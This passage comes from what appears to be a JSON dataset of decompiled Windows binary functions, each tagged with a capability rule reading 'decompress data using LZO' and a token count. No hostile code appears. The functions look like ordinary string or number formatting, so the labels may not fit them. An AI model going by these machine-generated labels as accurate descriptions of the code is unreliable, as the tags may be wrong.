iVar7 = iVar7 + 1;\n            puVar16 = puVar10 + -1;\n            *puVar16 = *(iVar4 + 0x30);\n        }\n        else {\n            iVar7 = iVar7 + 2;\n            puVar16 = puVar10 + -2;\n            puVar10[-1] = *(iVar4 + 0x28 + ((uVar8 >> 0xe & 1) + 2) * 2);\n            *puVar16 = *(iVar4 + 0x30);\n        }\n    }\n    iVar5 = *(arg_10h + 8);\n    puVar14 = puVar13;\n    if (iVar7 < iVar5) {\n        *(puVar13 + -4) = 0x476daf;\n        uVar17 = fcn.00437ed0();\n        iVar4 = -uVar17;\n        puVar14 = puVar13 + iVar4;\n        uVar8 = var_40h & 0xffff;\n        *(puVar13 + iVar4 + 0x14) = iVar7;\n        *(puVar13 + iVar4 + 4) = uVar8;\n        puVar16 = puVar13 + iVar4 + 0x27 & 0xfffffff0;\n        *(puVar13 + iVar4 + 0xc) = uVar17 >> 0x20;\n        *(puVar13 + iVar4 + 0x10) = iVar5;\n        *(puVar13 + iVar4 + 8) = puVar16;\n        *(puVar13 + iVar4) = arg_10h;\n        *(puVar13 + iVar4 + -4) = 0x476ddd;\n        fcn.004abd90();\n        iVar7 = iVar5;\n    }\n    uVar15 = var_38h;\n    *(arg_10h + 8) = 0;\n    if (var_38h == '\\0') {\n        iVar5 = *var_2ch;\n        puVar14[1] = iVar7;\n        *puVar14 = puVar16;\n        pcVar2 = *(iVar5 + 0x30);\n        puVar14[-1] = 0x476ccf;\n        iVar5 = (*pcVar2)();\n        if (iVar5 != iVar7) {\n            uVar15 = 1;\n        }\n    }\n    return CONCAT44(uVar15, var_2ch) & 0xffffffffff;\n}\n",
        "token_count": 1736
    },
    "00476ed0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00476ed0(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    ushort uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    ushort *puVar8;\n    int32_t *extraout_ECX;\n    char *pcVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t *piVar12;\n    uchar *puVar13;\n    char **ppcVar14;\n    uchar *puVar15;\n    ushort *puVar16;\n    uint uVar17;\n    ushort *puVar18;\n    bool bVar19;\n    ulong uVar20;\n    uint64_t in_stack_00000018;\n    uint uStackY148;\n    int32_t iStackY144;\n    char *pcStack136;\n    int32_t iStack132;\n    uchar auStack128 [27];\n    uchar auStack101 [5];\n    char *var_5ch;\n    uint32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_48h;\n    int32_t *var_44h;\n    int32_t var_40h;\n    ushort *s;\n    char *var_31h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_44h = arg_8h;\n    _var_50h = in_stack_00000018;\n    var_48h = arg_ch;\n    var_58h = arg_14h;\n    iStackY144 = 0x476f08;\n    var_40h = fcn.0044daf0(arg_10h + 0x6c);\n    iVar11 = *(arg_10h + 4);\n    if (iVar11 < 0) {\n        iVar11 = 6;\n    }\n    pcStack136 = arg_18h;\n    iStackY144 = arg_10h;\n    uStackY148 = 0x476f39;\n    fcn.0048d660();\n    uStackY148 = 0x476f51;\n    uVar20 = fcn.00437ed0();\n    iVar4 = -uVar20;\n    piVar12 = &stack0xffffff70 + iVar4;\n    s = &stack0xffffff9b + iVar4 & 0xfffffff0;\n    if (uVar20 >> 0x20 == 0x104) {\n        *(&stack0xffffff6c + iVar4) = 0x4771da;\n        var_2ch = fcn.004ae940();\n        uVar5 = _var_50h;\n        *(&stack0xffffff7c + iVar4) = &fcn.00476ed0::var_28h;\n        puVar16 = s;\n        *(&stack0xffffff78 + iVar4) = 0x2d;\n        *(&stack0xffffff74 + iVar4) = puVar16;\n        *(&stack0xffffff70 + iVar4) = &fcn.00476ed0::var_2ch;\n        *(&stack0xffffff80 + iVar4) = uVar5;\n        *(&stack0xffffff6c + iVar4) = 0x477202;\n        *NULL = fcn.004bd670();\n        if (0x2c < *NULL) {\n            var_5ch = *NULL + 1;\n            *(&stack0xffffff6c + iVar4) = 0x477222;\n            iVar11 = fcn.00437ed0();\n            iVar11 = -iVar11;\n            piVar12 = &stack0xffffff70 + iVar11 + iVar4;\n            s = &stack0xffffff9b + iVar11 + iVar4 & 0xfffffff0;\n            *(&stack0xffffff6c + iVar11 + iVar4) = 0x477233;\n            var_2ch = fcn.004ae940();\n            uVar5 = _var_50h;\n            pcVar9 = var_5ch;\n            *(&stack0xffffff7c + iVar11 + iVar4) = &fcn.00476ed0::var_28h;\n            puVar16 = s;\n            *(&stack0xffffff78 + iVar11 + iVar4) = pcVar9;\n            *(&stack0xffffff74 + iVar11 + iVar4) = puVar16;\n            *(&stack0xffffff70 + iVar11 + iVar4) = &fcn.00476ed0::var_2ch;\n            *(&stack0xffffff80 + iVar11 + iVar4) = uVar5;\n            *(&stack0xffffff6c + iVar11 + iVar4) = 0x477257;\n            *NULL = fcn.004bd670();\n        }\n    }\n    else {\n        *(&stack0xffffff6c + iVar4) = 0x476f6e;\n        var_2ch = fcn.004ae940();\n        uVar5 = _var_50h;\n        *(&stack0xffffff80 + iVar4) = iVar11;\n        puVar16 = s;\n        *(&stack0xffffff7c + iVar4) = &fcn.00476ed0::var_28h;\n        *(&stack0xffffff74 + iVar4) = puVar16;\n        *(&stack0xffffff78 + iVar4) = 0x2d;\n        *(&stack0xffffff70 + iVar4) = &fcn.00476ed0::var_2ch;\n        *(&stack0xffffff84 + iVar4) = uVar5;\n        *(&stack0xffffff6c + iVar4) = 0x476f9a;\n        *NULL = fcn.004bd670();\n        piVar12 = &stack0xffffff70 + iVar4;\n        if (0x2c < *NULL) {\n            var_5ch = *NULL + 1;\n            *(&stack0xffffff6c + iVar4) = 0x477095;\n            iVar7 = fcn.00437ed0();\n            iVar7 = -iVar7;\n            piVar12 = &stack0xffffff70 + iVar7 + iVar4;\n            s = &stack0xffffff9b + iVar7 + iVar4 & 0xfffffff0;\n            *(&stack0xffffff6c + iVar7 + iVar4) = 0x4770a6;\n            var_2ch = fcn.004ae940();\n            uVar5 = _var_50h;\n            pcVar9 = var_5ch;\n            *(&stack0xffffff80 + iVar7 + iVar4) = iVar11;\n            puVar16 = s;\n            *(&stack0xffffff7c + iVar7 + iVar4) = &fcn.00476ed0::var_28h;\n            *(&stack0xffffff74 + iVar7 + iVar4) = puVar16;\n            *(&stack0xffffff78 + iVar7 + iVar4) = pcVar9;\n            *(&stack0xffffff70 + iVar7 + iVar4) = &fcn.00476ed0::var_2ch;\n            *(&stack0xffffff84 + iVar7 + iVar4) = uVar5;\n            *(&stack0xffffff6c + iVar7 + iVar4) = 0x4770d1;\n            *NULL = fcn.004bd670();\n        }\n    }\n    *piVar12 = arg_10h + 0x6c;\n    piVar12[-1] = 0x476fae;\n    fcn.004c01c0();\n    piVar12[-1] = 0x476fc2;\n    uVar20 = fcn.00437ed0();\n    iVar4 = -uVar20;\n    iVar11 = *extraout_ECX;\n    pcVar9 = (uVar20 >> 0x20) + s;\n    *(piVar12 + iVar4) = s;\n    puVar16 = piVar12 + iVar4 + 0x2b & 0xfffffff0;\n    *(piVar12 + iVar4 + 4) = pcVar9;\n    *(piVar12 + iVar4 + 8) = puVar16;\n    pcVar3 = *(iVar11 + 0x2c);\n    puVar13 = piVar12 + iVar4 + -4;\n    *(piVar12 + iVar4 + -4) = 0x476fe2;\n    (*pcVar3)();\n    pcVar9 = stack0xffffffcc;\n    puVar18 = s;\n    ppcVar14 = puVar13 + -0xc;\n    puVar15 = puVar13 + -0xc;\n    if (stack0xffffffcc == NULL) {\n        if (*(var_40h + 0x10) != '\\0') goto code_r0x004770ef;\ncode_r0x0047702e:\n        pcVar6 = *(arg_10h + 8);\n        if (pcVar6 <= pcVar9) goto code_r0x0047703c;\n    }\n    else {\n        *(puVar13 + -4) = stack0xffffffcc;\n        *(puVar13 + -8) = 0x2e;\n        *(puVar13 + -0xc) = puVar18;\n        *(puVar13 + -0x10) = 0x477007;\n        iVar11 = sub.msvcrt.dll_memchr();\n        cVar1 = *(var_40h + 0x10);\n        if (iVar11 == 0) {\n            if ((cVar1 != '\\0') &&\n               ((pcVar9 < 3 ||\n                (((*(s + 1) < ':' && (_var_50h = _var_50h & 0xffffffffffffff00 | *(s + 1),  *(s + 1) - 0x30 < 10)) &&\n                 ('/' < *(s + 1))))))) goto code_r0x004770ef;\n            goto code_r0x0047702e;\n        }\n        puVar16[iVar11 - s] = *(var_40h + 0x24);\n        if (cVar1 == '\\0') goto code_r0x0047702e;\ncode_r0x004770ef:\n        *(puVar13 + -0x10) = 0x477101;\n        uVar20 = fcn.00437ed0();\n        iVar4 = var_40h;\n        iVar11 = -uVar20;\n        puVar8 = puVar13 + iVar11 + 0x1f & 0xfffffff0;\n        bVar19 = (*s - 0x2bU & 0xfd) == 0;\n        puVar18 = puVar8;\n        if (bVar19) {\n            uVar2 = *puVar16;\n            puVar16 = puVar16 + 1;\n            stack0xffffffcc = pcVar9 + -1;\n            *puVar8 = uVar2;\n            puVar18 = puVar8 + 1;\n        }\n        s = puVar8;\n        *(puVar13 + iVar11 + 0xc) = &fcn.00476ed0::var_31h + 1;\n        *(puVar13 + iVar11 + 8) = puVar16;\n        *(puVar13 + iVar11 + 4) = puVar18;\n        *(puVar13 + iVar11) = uVar20 >> 0x20;\n        *(puVar13 + iVar11 + -4) = *(iVar4 + 0x26);\n        *(puVar13 + iVar11 + -8) = *(iVar4 + 0xc);\n        *(puVar13 + iVar11 + -0xc) = *(iVar4 + 8);\n        *(puVar13 + iVar11 + -0x10) = 0x47716c;\n        fcn.00476e00();\n        pcVar9 = stack0xffffffcc + bVar19;\n        puVar15 = puVar13 + iVar11 + -0x28;\n        ppcVar14 = puVar13 + iVar11 + -0x28;\n        stack0xffffffcc = pcVar9;\n        pcVar6 = *(arg_10h + 8);\n        puVar16 = s;\n        if (pcVar6 <= pcVar9) goto code_r0x0047703c;\n    }\n    *(puVar15 + -4) = 0x477197;\n    iVar11 = fcn.00437ed0();\n    uVar10 = var_58h & 0xffff;\n    iVar11 = -iVar11;\n    ppcVar14 = puVar15 + iVar11;\n    *(puVar15 + iVar11 + 0x14) = pcVar9;\n    *(puVar15 + iVar11 + 0xc) = puVar16;\n    *(puVar15 + iVar11 + 8) = puVar15 + iVar11 + 0x2b & 0xfffffff0;\n    s = puVar15 + iVar11 + 0x2b & 0xfffffff0;\n    *(puVar15 + iVar11 + 0x10) = pcVar6;\n    *(puVar15 + iVar11) = arg_10h;\n    *(puVar15 + iVar11 + 4) = uVar10;\n    *(puVar15 + iVar11 + -4) = 0x4771c8;\n    fcn.004abd90();\n    stack0xffffffcc = pcVar6;\n    pcVar9 = pcVar6;\n    puVar16 = s;\ncode_r0x0047703c:\n    uVar17 = var_48h;\n    *(arg_10h + 8) = 0;\n    if (var_48h == '\\0') {\n        iVar11 = *var_44h;\n        ppcVar14[1] = pcVar9;\n        *ppcVar14 = puVar16;\n        pcVar3 = *(iVar11 + 0x30);\n        ppcVar14[-1] = 0x47705e;\n        pcVar6 = (*pcVar3)();\n        if (pcVar9 != pcVar6) {\n            uVar17 = 1;\n        }\n    }\n    return CONCAT44(uVar17, var_44h) & 0xffffffffff;\n}\n",
        "token_count": 3183
    },
    "004772b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl fcn.004772b0(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    ushort uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    ushort *puVar7;\n    int32_t *extraout_ECX;\n    char *pcVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uchar *puVar12;\n    char **ppcVar13;\n    uchar *puVar14;\n    ushort *puVar15;\n    uint uVar16;\n    ushort *puVar17;\n    bool bVar18;\n    ulong uVar19;\n    unkbyte10 in_stack_00000018;\n    uint uStackY132;\n    int32_t iStackY128;\n    char *pcStack120;\n    int32_t iStack116;\n    uchar auStack112 [24];\n    char *var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t *var_44h;\n    int32_t var_40h;\n    ushort *s;\n    char *var_31h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_44h = arg_8h;\n    var_48h = arg_ch;\n    var_50h = arg_14h;\n    iStackY128 = 0x4772e2;\n    var_40h = fcn.0044daf0(arg_10h + 0x6c);\n    iVar10 = *(arg_10h + 4);\n    if (iVar10 < 0) {\n        iVar10 = 6;\n    }\n    pcStack120 = arg_18h;\n    iStackY128 = arg_10h;\n    uStackY132 = 0x477313;\n    fcn.0048d660();\n    uStackY132 = 0x47732b;\n    uVar19 = fcn.00437ed0();\n    iVar4 = -uVar19;\n    piVar11 = &stack0xffffff80 + iVar4;\n    s = &fcn.004772b0::var_50h + iVar4 + 3 & 0xfffffff0;\n    if (uVar19 >> 0x20 == 0x104) {\n        *(&stack0xffffff7c + iVar4) = 0x4775ba;\n        var_2ch = fcn.004ae940();\n        *(&stack0xffffff8c + iVar4) = &fcn.004772b0::var_28h;\n        puVar15 = s;\n        *(&stack0xffffff88 + iVar4) = 0x36;\n        *(&stack0xffffff90 + iVar4) = in_stack_00000018;\n        *(&stack0xffffff84 + iVar4) = puVar15;\n        *(&stack0xffffff80 + iVar4) = &fcn.004772b0::var_2ch;\n        *(&stack0xffffff7c + iVar4) = 0x4775e2;\n        *NULL = fcn.004bd670();\n        if (0x35 < *NULL) {\n            var_54h = *NULL + 1;\n            *(&stack0xffffff7c + iVar4) = 0x477602;\n            iVar10 = fcn.00437ed0();\n            iVar10 = -iVar10;\n            piVar11 = &stack0xffffff80 + iVar10 + iVar4;\n            s = &fcn.004772b0::var_50h + iVar10 + iVar4 + 3 & 0xfffffff0;\n            *(&stack0xffffff7c + iVar10 + iVar4) = 0x477613;\n            var_2ch = fcn.004ae940();\n            pcVar8 = var_54h;\n            *(&stack0xffffff8c + iVar10 + iVar4) = &fcn.004772b0::var_28h;\n            puVar15 = s;\n            *(&stack0xffffff88 + iVar10 + iVar4) = pcVar8;\n            *(&stack0xffffff90 + iVar10 + iVar4) = in_stack_00000018;\n            *(&stack0xffffff84 + iVar10 + iVar4) = puVar15;\n            *(&stack0xffffff80 + iVar10 + iVar4) = &fcn.004772b0::var_2ch;\n            *(&stack0xffffff7c + iVar10 + iVar4) = 0x477637;\n            *NULL = fcn.004bd670();\n        }\n    }\n    else {\n        *(&stack0xffffff7c + iVar4) = 0x477348;\n        var_2ch = fcn.004ae940();\n        *(&stack0xffffff90 + iVar4) = iVar10;\n        puVar15 = s;\n        *(&stack0xffffff8c + iVar4) = &fcn.004772b0::var_28h;\n        *(&stack0xffffff94 + iVar4) = in_stack_00000018;\n        *(&stack0xffffff84 + iVar4) = puVar15;\n        *(&stack0xffffff88 + iVar4) = 0x36;\n        *(&stack0xffffff80 + iVar4) = &fcn.004772b0::var_2ch;\n        *(&stack0xffffff7c + iVar4) = 0x477374;\n        *NULL = fcn.004bd670();\n        piVar11 = &stack0xffffff80 + iVar4;\n        if (0x35 < *NULL) {\n            var_54h = *NULL + 1;\n            *(&stack0xffffff7c + iVar4) = 0x477474;\n            iVar6 = fcn.00437ed0();\n            iVar6 = -iVar6;\n            piVar11 = &stack0xffffff80 + iVar6 + iVar4;\n            s = &fcn.004772b0::var_50h + iVar6 + iVar4 + 3 & 0xfffffff0;\n            *(&stack0xffffff7c + iVar6 + iVar4) = 0x477485;\n            var_2ch = fcn.004ae940();\n            pcVar8 = var_54h;\n            *(&stack0xffffff90 + iVar6 + iVar4) = iVar10;\n            puVar15 = s;\n            *(&stack0xffffff8c + iVar6 + iVar4) = &fcn.004772b0::var_28h;\n            *(&stack0xffffff94 + iVar6 + iVar4) = in_stack_00000018;\n            *(&stack0xffffff84 + iVar6 + iVar4) = puVar15;\n            *(&stack0xffffff88 + iVar6 + iVar4) = pcVar8;\n            *(&stack0xffffff80 + iVar6 + iVar4) = &fcn.004772b0::var_2ch;\n            *(&stack0xffffff7c + iVar6 + iVar4) = 0x4774b0;\n            *NULL = fcn.004bd670();\n        }\n    }\n    *piVar11 = arg_10h + 0x6c;\n    piVar11[-1] = 0x477388;\n    fcn.004c01c0();\n    piVar11[-1] = 0x47739c;\n    uVar19 = fcn.00437ed0();\n    iVar4 = -uVar19;\n    iVar10 = *extraout_ECX;\n    pcVar8 = (uVar19 >> 0x20) + s;\n    *(piVar11 + iVar4) = s;\n    puVar15 = piVar11 + iVar4 + 0x2f & 0xfffffff0;\n    *(piVar11 + iVar4 + 4) = pcVar8;\n    *(piVar11 + iVar4 + 8) = puVar15;\n    pcVar3 = *(iVar10 + 0x2c);\n    puVar12 = piVar11 + iVar4 + -4;\n    *(piVar11 + iVar4 + -4) = 0x4773bc;\n    (*pcVar3)();\n    pcVar8 = stack0xffffffcc;\n    puVar17 = s;\n    ppcVar13 = puVar12 + -0xc;\n    puVar14 = puVar12 + -0xc;\n    if (stack0xffffffcc == NULL) {\n        if (*(var_40h + 0x10) != '\\0') goto code_r0x004774cf;\ncode_r0x00477408:\n        pcVar5 = *(arg_10h + 8);\n        if (pcVar5 <= pcVar8) goto code_r0x00477416;\n    }\n    else {\n        *(puVar12 + -4) = stack0xffffffcc;\n        *(puVar12 + -8) = 0x2e;\n        *(puVar12 + -0xc) = puVar17;\n        *(puVar12 + -0x10) = 0x4773e1;\n        iVar10 = sub.msvcrt.dll_memchr();\n        cVar1 = *(var_40h + 0x10);\n        if (iVar10 == 0) {\n            if ((cVar1 != '\\0') &&\n               ((pcVar8 < 3 ||\n                (((*(s + 1) < ':' && (var_54h = var_54h & 0xffffff00 | *(s + 1),  *(s + 1) - 0x30 < 10)) &&\n                 ('/' < *(s + 1))))))) goto code_r0x004774cf;\n            goto code_r0x00477408;\n        }\n        puVar15[iVar10 - s] = *(var_40h + 0x24);\n        if (cVar1 == '\\0') goto code_r0x00477408;\ncode_r0x004774cf:\n        *(puVar12 + -0x10) = 0x4774e1;\n        uVar19 = fcn.00437ed0();\n        iVar4 = var_40h;\n        iVar10 = -uVar19;\n        puVar7 = puVar12 + iVar10 + 0x23 & 0xfffffff0;\n        bVar18 = (*s - 0x2bU & 0xfd) == 0;\n        puVar17 = puVar7;\n        if (bVar18) {\n            uVar2 = *puVar15;\n            puVar15 = puVar15 + 1;\n            stack0xffffffcc = pcVar8 + -1;\n            *puVar7 = uVar2;\n            puVar17 = puVar7 + 1;\n        }\n        s = puVar7;\n        *(puVar12 + iVar10 + 0xc) = &fcn.004772b0::var_31h + 1;\n        *(puVar12 + iVar10 + 8) = puVar15;\n        *(puVar12 + iVar10 + 4) = puVar17;\n        *(puVar12 + iVar10) = uVar19 >> 0x20;\n        *(puVar12 + iVar10 + -4) = *(iVar4 + 0x26);\n        *(puVar12 + iVar10 + -8) = *(iVar4 + 0xc);\n        *(puVar12 + iVar10 + -0xc) = *(iVar4 + 8);\n        *(puVar12 + iVar10 + -0x10) = 0x47754c;\n        fcn.00476e00();\n        pcVar8 = stack0xffffffcc + bVar18;\n        puVar14 = puVar12 + iVar10 + -0x28;\n        ppcVar13 = puVar12 + iVar10 + -0x28;\n        stack0xffffffcc = pcVar8;\n        pcVar5 = *(arg_10h + 8);\n        puVar15 = s;\n        if (pcVar5 <= pcVar8) goto code_r0x00477416;\n    }\n    *(puVar14 + -4) = 0x477577;\n    iVar10 = fcn.00437ed0();\n    uVar9 = var_50h & 0xffff;\n    iVar10 = -iVar10;\n    ppcVar13 = puVar14 + iVar10;\n    *(puVar14 + iVar10 + 0x14) = pcVar8;\n    *(puVar14 + iVar10 + 0xc) = puVar15;\n    *(puVar14 + iVar10 + 8) = puVar14 + iVar10 + 0x2f & 0xfffffff0;\n    s = puVar14 + iVar10 + 0x2f & 0xfffffff0;\n    *(puVar14 + iVar10 + 0x10) = pcVar5;\n    *(puVar14 + iVar10) = arg_10h;\n    *(puVar14 + iVar10 + 4) = uVar9;\n    *(puVar14 + iVar10 + -4) = 0x4775a8;\n    fcn.004abd90();\n    stack0xffffffcc = pcVar5;\n    pcVar8 = pcVar5;\n    puVar15 = s;\ncode_r0x00477416:\n    uVar16 = var_48h;\n    *(arg_10h + 8) = 0;\n    if (var_48h == '\\0') {\n        iVar10 = *var_44h;\n        ppcVar13[1] = pcVar8;\n        *ppcVar13 = puVar15;\n        pcVar3 = *(iVar10 + 0x30);\n        ppcVar13[-1] = 0x477438;\n        pcVar5 = (*pcVar3)();\n        if (pcVar8 != pcVar5) {\n            uVar16 = 1;\n        }\n    }\n    return CONCAT44(uVar16, var_44h) & 0xffffffffff;\n}\n",
        "token_count": 3116
    },
    "00477860": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00477860(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t extraout_ECX;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint64_t uVar10;\n    ulong uVar11;\n    uint16_t *apuStackY148 [2];\n    uchar auStack109 [9];\n    uint16_t *var_60h;\n    int32_t var_5ch;\n    uint32_t var_58h;\n    uint32_t var_52h;\n    uint32_t var_4ch;\n    uint var_30h;\n    uint var_2ch;\n    uint var_19h;\n    uint var_ch;\n    \n    unique0x00007a00 = *(arg_10h + 0xc);\n    var_52h._0_2_ = arg_14h;\n    if ((unique0x00007a00 & 1) == 0) {\n        apuStackY148[1] = 0x4778a8;\n        uVar10 = fcn.00476510(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h & 0xff);\n        return uVar10 & 0xffffffff | (arg_ch & 0xffffff00 | uVar10 >> 0x20 & 0xff) << 0x20;\n    }\n    var_58h = arg_18h;\n    var_4ch = var_4ch & 0xffffff00 | arg_ch & 0xff;\n    apuStackY148[1] = 0x4778e7;\n    iVar3 = fcn.0044daf0(arg_10h + 0x6c);\n    if (var_58h == '\\0') {\n        var_58h = *(iVar3 + 0x1c);\n        uVar6 = *(iVar3 + 0x20);\n        iVar3 = *(arg_10h + 8);\n        if (uVar6 < iVar3) goto code_r0x0047790c;\ncode_r0x0047799c:\n        *(arg_10h + 8) = 0;\n        if (var_4ch != '\\0') goto code_r0x004779cc;\ncode_r0x004779ac:\n        apuStackY148[1] = var_58h;\n        apuStackY148[0] = 0x4779c0;\n        var_4ch = uVar6;\n        uVar6 = (**(*arg_8h + 0x30))();\n        var_4ch = var_4ch != uVar6;\n    }\n    else {\n        var_58h = *(iVar3 + 0x14);\n        uVar6 = *(iVar3 + 0x18);\n        iVar3 = *(arg_10h + 8);\n        if (iVar3 <= uVar6) goto code_r0x0047799c;\ncode_r0x0047790c:\n        var_5ch = iVar3 - uVar6;\n        apuStackY148[0] = 0x477922;\n        uVar11 = fcn.00437ed0();\n        uVar2 = var_58h;\n        iVar7 = var_5ch;\n        uVar6 = uVar11 >> 0x20;\n        iVar3 = -uVar11;\n        puVar4 = &stack0xffffff93 + iVar3 & 0xfffffff0;\n        var_60h = puVar4;\n        puVar5 = puVar4;\n        iVar8 = extraout_ECX;\n        do {\n            *puVar5 = var_52h;\n            puVar5 = puVar5 + 1;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n        *(arg_10h + 8) = 0;\n        if ((stack0xffffffac & 0xb0) == 0x20) {\n            if (var_4ch != '\\0') goto code_r0x004779cc;\n            iVar7 = *arg_8h;\n            *(&stack0xffffff74 + iVar3) = uVar6;\n            var_4ch = uVar6;\n            *(&stack0xffffff70 + iVar3) = uVar2;\n            pcVar1 = *(iVar7 + 0x30);\n            puVar9 = &stack0xffffff6c + iVar3;\n            *(&stack0xffffff6c + iVar3) = 0x4779fb;\n            uVar6 = (*pcVar1)();\n            iVar3 = var_5ch;\n            puVar5 = var_60h;\n            if (var_4ch == uVar6) {\n                iVar7 = *arg_8h;\n                *(puVar9 + -4) = var_5ch;\n                *(puVar9 + -8) = puVar5;\n                pcVar1 = *(iVar7 + 0x30);\n                *(puVar9 + -0xc) = 0x477a1d;\n                iVar7 = (*pcVar1)();\n                var_4ch = iVar3 != iVar7;\n                goto code_r0x004779cc;\n            }\n        }\n        else {\n            if (var_4ch != '\\0') goto code_r0x004779cc;\n            iVar8 = *arg_8h;\n            unique0x1000019c = uVar6;\n            *(&stack0xffffff74 + iVar3) = var_5ch;\n            *(&stack0xffffff70 + iVar3) = puVar4;\n            iVar3 = (**(iVar8 + 0x30))();\n            uVar6 = stack0xffffffac;\n            if (iVar7 == iVar3) goto code_r0x004779ac;\n        }\n        var_4ch = 1;\n    }\ncode_r0x004779cc:\n    return CONCAT44(arg_ch & 0xffffff00 | var_4ch & 0xff, arg_8h);\n}\n",
        "token_count": 1424
    },
    "004789f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.004789f0(int32_t *arg_8h, uint32_t arg_ch, uint arg_10h, uint noname_3, int32_t *arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t *piVar9;\n    int32_t *piVar10;\n    int32_t *piVar11;\n    uint *puVar12;\n    int32_t *piVar13;\n    int32_t iVar15;\n    int32_t *piVar16;\n    uint uStack68;\n    int32_t aiStack64 [5];\n    uchar uStack41;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    int32_t *piVar14;\n    \n    aiStack64[1] = arg_24h + 0x6c;\n    aiStack64[0] = 0x478a07;\n    var_1ch = fcn.004c0160();\n    aiStack64[0] = 0x478a1e;\n    iVar4 = fcn.00437ed0();\n    iVar4 = -iVar4;\n    *(&stack0xffffffc4 + iVar4) = &fcn.004789f0::arg_10h;\n    *(&stack0xffffffc0 + iVar4) = 0x478a35;\n    cVar2 = fcn.004502d0();\n    if (cVar2 == '\\0') {\n        *(&stack0xffffffbc + iVar4) = 0x478a5d;\n        cVar2 = fcn.004503c0();\n        if (arg_20h != 0) {\n            iVar15 = 0;\n            var_20h = &stack0xffffffd7 + iVar4 & 0xfffffff0;\n            piVar16 = NULL;\n            iVar7 = arg_1ch;\n            piVar11 = &stack0xffffffc0 + iVar4;\n            do {\n                while (cVar3 = **(iVar7 + iVar15 * 4),  cVar3 == cVar2) {\ncode_r0x00478aac:\n                    var_20h[piVar16] = iVar15;\n                    piVar16 = piVar16 + 1;\n                    iVar15 = iVar15 + 1;\n                    piVar13 = piVar11;\n                    if (arg_20h == iVar15) goto code_r0x00478abd;\n                }\n                iVar4 = *var_1ch;\n                *piVar11 = cVar3;\n                pcVar1 = *(iVar4 + 8);\n                piVar10 = piVar11 + -1;\n                piVar11[-1] = 0x478a90;\n                arg_1ch = iVar7;\n                cVar3 = (*pcVar1)();\n                piVar11 = piVar10 + -4;\n                piVar13 = piVar10 + -4;\n                iVar7 = arg_1ch;\n                if (cVar2 == cVar3) goto code_r0x00478aac;\n                iVar15 = iVar15 + 1;\n                piVar11 = piVar10 + -4;\n            } while (arg_20h != iVar15);\ncode_r0x00478abd:\n            piVar11 = var_20h;\n            var_20h = NULL;\njoined_r0x00478ace:\n            if (0x1 < piVar16) {\n                *piVar13 = *(arg_1ch + *piVar11 * 4);\n                piVar13[-1] = 0x478ae6;\n                uVar5 = sub.msvcrt.dll_strlen();\n                var_1ch = piVar16;\n                piVar9 = 0x1;\n                do {\n                    *piVar13 = *(arg_1ch + piVar11[piVar9] * 4);\n                    piVar13[-1] = 0x478b03;\n                    uVar6 = sub.msvcrt.dll_strlen();\n                    piVar16 = var_1ch;\n                    if (uVar6 < uVar5) {\n                        uVar5 = uVar6;\n                    }\n                    piVar9 = piVar9 + 1;\n                } while (piVar9 < var_1ch);\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    pcVar1 = *(*arg_8h + 0x28);\n                    piVar14 = piVar13 + -1;\n                    piVar13 = piVar13 + -1;\n                    *piVar14 = 0x478c85;\n                    (*pcVar1)();\n                }\n                var_20h = var_20h + 1;\n                arg_ch = 0xffffffff;\n                if (uVar5 <= var_20h) goto code_r0x00478a3c;\n                *piVar13 = &fcn.004789f0::arg_10h;\n                piVar13[-1] = 0x478b50;\n                cVar2 = fcn.004502d0();\n                piVar13 = piVar13 + -1;\n                if (cVar2 != '\\0') goto code_r0x00478a3c;\n                piVar9 = NULL;\n                do {\n                    while( true ) {\n                        piVar8 = piVar11 + piVar9;\n                        var_1ch = var_1ch & 0xffffff00 | 